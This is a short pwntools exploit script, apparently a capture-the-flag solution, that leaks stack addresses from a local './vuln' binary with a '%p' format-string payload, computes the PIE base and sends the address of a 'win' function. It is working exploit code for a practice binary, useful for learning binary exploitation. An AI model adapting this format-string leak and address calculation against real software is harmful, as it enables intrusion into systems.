#!/bin/python3

from pwn import *


elf = ELF("./vuln")
p = process("./vuln")

win_offset = elf.symbols["win"]

print()
p.recvuntil(b":")
p.sendline(b"%p"*20)
print()

leaks = p.recvline().decode("latin-1").split("0x")
leaked_addr = int(leaks[16], 16)

base_addr = leaked_addr - 0x1441
win_addr = hex(base_addr + win_offset)

p.recvuntil(b":")
p.sendline(win_addr)

print(p.recvall().decode('latin-1'))

